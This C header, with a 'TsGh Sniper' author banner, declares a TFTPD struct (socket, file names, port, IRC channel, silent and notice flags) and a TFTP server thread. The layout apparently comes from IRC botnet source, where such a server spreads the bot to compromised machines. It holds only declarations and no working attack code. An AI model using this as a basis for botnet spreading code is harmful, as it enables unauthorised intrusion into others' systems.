/////////////////////////////////////////
///                                   ///
///  TsGh By TsGh Sniper              ///
///                                   ///
/////////////////////////////////////////


#ifndef NO_TFTPD
typedef struct TFTPD 
{
	SOCKET sock;
	char filename[MAX_PATH];
	char requestname[MAX_PATH];
	int threadnum;
	int threads;
	unsigned short port;
	char chan[MAXCHANLEN];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TFTPD;

DWORD WINAPI TftpdThread(LPVOID param);
#endif